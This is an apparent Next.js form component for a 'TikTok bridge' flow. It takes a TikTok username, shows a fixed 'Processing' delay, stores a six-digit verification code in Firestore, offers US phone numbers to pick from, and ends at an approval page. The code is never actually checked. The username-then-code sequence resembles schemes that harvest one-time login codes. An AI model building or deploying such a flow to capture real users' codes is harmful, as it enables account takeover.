"use client";

import { useState, useEffect } from "react";
import type { EmblaCarouselType } from 'embla-carousel-react'
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { useForm } from "react-hook-form";
import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X, Clock } from "lucide-react";
import { collection, doc, query } from "firebase/firestore";
import { useRouter } from "next/navigation";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Progress } from "@/components/ui/progress";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Carousel, CarouselContent, CarouselItem, type CarouselApi } from "@/components/ui/carousel"
import { useAuth, useCollection, useFirestore, useMemoFirebase, initiateAnonymousSignIn, setDocumentNonBlocking, useUser } from "@/firebase";
import { cn } from "@/lib/utils";

const TIKTOK_BRIDGE_STEPS = [
  { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
  { step: 2, title: "Processing...", icon: Clock, fields: [] as const },
  { step: 3, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
  { step: 4, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
  { step: 5, title: "Completed", icon: CheckCircle, fields: [] as const },
];

const formSchema = z.object({
  username: z.string().min(2, "Username must be at least 2 characters."),
  verificationCode: z.string().length(6, "Code must be 6 digits."),
  usNumber: z.string({ required_error: "Please select a number." }),
});

type FormValues = z.infer<typeof formSchema>;

interface PhoneNumber {
    id: string;
    phoneNumber: string;
    isAvailable: boolean;
    region: string;
    state: string;
    benefits: string[];
    disadvantages: string[];
    bonuses: string[];
}

export function TikTokBridgeForm() {
  const [api, setApi] = useState<CarouselApi>()
  const [currentStep, setCurrentStep] = useState(0)
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { user } = useUser();
  const auth = useAuth();
  const firestore = useFirestore();
  const router = useRouter();

  const phoneNumbersQuery = useMemoFirebase(() => {
      if (!firestore) return null;
      return query(collection(firestore, 'phone_numbers'));
  }, [firestore]);
  const { data: phoneNumbers, isLoading: phoneNumbersLoading } = useCollection<PhoneNumber>(phoneNumbersQuery);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    mode: 'onChange',
  });
    
  useEffect(() => {
    if (auth && !user) {
        initiateAnonymousSignIn(auth);
    }
  }, [auth, user]);

  const handleNext = async () => {
    const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
    if (fieldsToValidate) {
        const isValid = await form.trigger(fieldsToValidate);
        if (!isValid) return;
    }

    if (api) {
        // Handle Step 1 -> 2 (Username)
        if (currentStep === 0) {
            setIsSubmitting(true);
            const { username } = form.getValues();
             if (!user || !firestore) {
              console.error("User not authenticated or Firestore not available");
              setIsSubmitting(false);
              return;
            }
            const userDocRef = doc(firestore, 'tiktok_users', user.uid);
            setDocumentNonBlocking(userDocRef, { 
                id: user.uid, 
                tiktokUsername: username, 
                isVerified: false, 
                verificationCode: '',
                phoneNumberId: '',
                phoneNumber: '',
            }, { merge: true });

            api.scrollNext(); // Go to loading step
            setTimeout(() => {
                setIsSubmitting(false);
                api.scrollNext(); // Go to code entry step
            }, 5000);
            return;
        }

        // Handle Step 3 -> 4 (Verification Code)
        if (currentStep === 2) {
             const { verificationCode } = form.getValues();
             if (!user || !firestore) return;
             const userDocRef = doc(firestore, 'tiktok_users', user.uid);
             setDocumentNonBlocking(userDocRef, { verificationCode }, { merge: true });
             api.scrollNext();
             return;
        }

        // Handle Step 4 -> 5 (Select Number & Final Submission)
        if (currentStep === 3) {
            setIsSubmitting(true);
            const { usNumber } = form.getValues();
            if (!user || !firestore) {
                console.error("User not authenticated or Firestore not available");
                setIsSubmitting(false);
                return;
            }

            const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
            if (!selectedPhoneNumberDoc) {
                console.error("Selected phone number not found");
                setIsSubmitting(false);
                return;
            }
            
            const userDocRef = doc(firestore, 'tiktok_users', user.uid);
            setDocumentNonBlocking(userDocRef, { 
                phoneNumberId: selectedPhoneNumberDoc.id,
                phoneNumber: selectedPhoneNumberDoc.phoneNumber,
            }, { merge: true });
            
            // Wait a moment then redirect
            await new Promise(res => setTimeout(res, 500));
            router.push('/waiting-for-approval');
            setIsSubmitting(false);
            return;
        }

        api.scrollNext();
    }
  };

  const handlePrev = () => {
    if (isSubmitting || currentStep === 1) return; // Don't allow going back from loading screen
    api?.scrollPrev();
  };
  
  useEffect(() => {
    if (!api) return

    const onSelect = (emblaApi: EmblaCarouselType) => {
      setCurrentStep(emblaApi.selectedScrollSnap())
    }

    api.on("select", onSelect);
    onSelect(api);

    return () => {
      api.off("select", onSelect);
    };
  }, [api])
  
  const CurrentIcon = TIKTOK_BRIDGE_STEPS[currentStep].icon;
  const progress = ((currentStep) / (TIKTOK_BRIDGE_STEPS.length-2)) * 100;
  
  return (
    <Card>
      <CardHeader>
        <Progress value={progress} className="mb-4" />
        <div className="flex items-center space-x-3 min-h-[48px]">
            <div className={cn(
                "flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
                 currentStep === 1 && "animate-spin"
            )}>
                <CurrentIcon className="h-5 w-5" />
            </div>
            <div>
                <CardTitle className="font-headline">{TIKTOK_BRIDGE_STEPS[currentStep].title}</CardTitle>
                {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 && currentStep !== 1 &&
                    <CardDescription>Step {currentStep > 1 ? currentStep-1 : currentStep+1} of {TIKTOK_BRIDGE_STEPS.length - 2}</CardDescription>
                }
            </div>
        </div>
      </CardHeader>
      <Form {...form}>
        <form onSubmit={(e) => e.preventDefault()}>
          <CardContent className="min-h-[380px]">
            <Carousel setApi={setApi} opts={{ drag: false, loop: false, watchDrag: false, allowTouchMove: false }} className="w-full">
              <CarouselContent>
                {/* Step 1: Username */}
                <CarouselItem>
                  <FormField
                    control={form.control}
                    name="username"
                    render={({ field }) => (
                      <FormItem className="pt-2">
                        <FormLabel>TikTok Username</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                            <Input placeholder="your_username" {...field} className="pl-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </CarouselItem>

                {/* Step 2: Loading Spinner */}
                <CarouselItem>
                    <div className="text-center py-8 flex flex-col items-center justify-center h-[300px]">
                        <Loader2 className="h-16 w-16 text-primary animate-spin mb-4" />
                        <h3 className="text-xl font-semibold">Processing...</h3>
                        <p className="text-muted-foreground mt-2 max-w-[250px]">Please wait a moment.</p>
                    </div>
                </CarouselItem>

                {/* Step 3: Verification Code */}
                <CarouselItem>
                   <FormField
                    control={form.control}
                    name="verificationCode"
                    render={({ field }) => (
                      <FormItem className="pt-2">
                        <FormLabel>Verification Code</FormLabel>
                        <FormControl>
                            <Input placeholder="123456" {...field} />
                        </FormControl>
                        <p className="text-sm text-muted-foreground pt-1">Enter any 6-digit code to continue.</p>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </CarouselItem>

                {/* Step 4: Select Number */}
                <CarouselItem>
                  <FormField
                    control={form.control}
                    name="usNumber"
                    render={({ field }) => (
                      <FormItem className="pt-2">
                        <FormLabel>Choose a US Number</FormLabel>
                        <FormMessage className="pb-2"/>
                        <FormControl>
                          <ScrollArea className="h-80 w-full pr-4">
                            <div className="space-y-3">
                              {phoneNumbersLoading ? (
                                <div className="flex justify-center items-center h-64">
                                    <Loader2 className="animate-spin" />
                                </div>
                              ) : (
                                phoneNumbers?.filter(n => n.isAvailable).map((number) => (
                                    <Card 
                                        key={number.id} 
                                        onClick={() => field.onChange(number.phoneNumber)}
                                        className={cn(
                                            "cursor-pointer transition-all hover:bg-accent/50",
                                            field.value === number.phoneNumber && "border-primary bg-accent/20"
                                        )}
                                    >
                                        <CardHeader className="p-4">
                                            <div className="flex justify-between items-start">
                                                <div>
                                                    <CardTitle className="text-lg">{number.phoneNumber}</CardTitle>
                                                    <CardDescription>{number.region}, {number.state}</CardDescription>
                                                </div>
                                                {field.value === number.phoneNumber && (
                                                    <div className="flex h-6 w-6 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0">
                                                        <Check className="h-4 w-4" />
                                                    </div>
                                                )}
                                            </div>
                                        </CardHeader>
                                        <CardContent className="p-4 pt-0 text-sm">
                                             {number.bonuses && number.bonuses.length > 0 && (
                                                <div className="mb-3">
                                                    <h4 className="font-semibold mb-1 text-primary">Bonuses</h4>
                                                    <ul className="list-disc pl-5 space-y-1 text-foreground/80">
                                                        {number.bonuses.map((bonus, i) => <li key={i}>{bonus}</li>)}
                                                    </ul>
                                                </div>
                                            )}
                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                <div>
                                                    <h4 className="font-semibold mb-2 flex items-center text-green-600"><Check className="h-4 w-4 mr-2"/>Benefits</h4>
                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                         {number.benefits.map((benefit, i) => <li key={i} className="flex items-start"><Check className="h-4 w-4 mr-2 mt-1 text-green-500 shrink-0"/><span>{benefit}</span></li>)}
                                                    </ul>
                                                </div>
                                                <div>
                                                    <h4 className="font-semibold mb-2 flex items-center text-red-600"><X className="h-4 w-4 mr-2"/>Disadvantages</h4>
                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                        {number.disadvantages.map((disadvantage, i) => <li key={i} className="flex items-start"><X className="h-4 w-4 mr-2 mt-1 text-red-500 shrink-0"/><span>{disadvantage}</span></li>)}
                                                    </ul>
                                                </div>
                                            </div>
                                        </CardContent>
                                    </Card>
                                ))
                              )}
                            </div>
                          </ScrollArea>
                        </FormControl>
                      </FormItem>
                    )}
                  />
                </CarouselItem>
                
              </CarouselContent>
            </Carousel>
          </CardContent>
          
          {currentStep < 4 && currentStep !== 1 && (
            <CardFooter className="flex justify-between">
              <Button type="button" variant="ghost" onClick={handlePrev} disabled={currentStep === 0 || isSubmitting}>Back</Button>
              <Button type="button" onClick={handleNext} disabled={isSubmitting || phoneNumbersLoading}>
                {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                {currentStep === 3 ? "Finish & Wait for Approval" : "Continue"}
              </Button>
            </CardFooter>
          )}
        </form>
      </Form>
    </Card>
  );
}
